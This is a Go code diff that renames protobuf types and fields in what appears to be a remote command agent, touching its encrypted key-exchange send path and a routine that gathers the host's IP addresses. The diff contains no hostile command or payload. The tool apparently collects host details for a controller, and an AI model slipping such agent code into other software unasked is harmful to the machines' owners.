@@ -146,10 +146,10 @@ func (a *Agent) SendEncrypted(message []byte, command AgentCommand) {
 	if command == AgentCommand_AGENT_COMMAND_KEYX {
 		data = message
 	} else {
-		commandResponse := &Command_Response{}
+		commandResponse := &CommandResponse{}
 		commandResponse.Command = AgentCommand_AGENT_COMMAND_KEYX
 		commandResponse.Data = message
-		commandResponse.Status = AgentCommandStatus_COMMAND_STATUS_SUCCESS
+		commandResponse.Status = AgentCommandStatus_AGENT_COMMAND_STATUS_SUCCESS
 		commandResponseProto, marshalError := proto.Marshal(commandResponse)
 		if marshalError != nil {
 			log.Printf("failed marshal command response: %x (err: %q)\n", commandResponse, marshalError)
@@ -622,7 +622,7 @@ func (a *Agent) GetSysInfo() *SysInfoData {
 				if ipnet.IP.To4() != nil {
 					ip := ipnet.IP.String()
 					if !strings.HasPrefix(ip, "169.254.") {
-						sysinfo.Ip = append(sysinfo.Ip, ip)
+						sysinfo.Ips = append(sysinfo.Ips, ip)
 					}
 				}
 			}
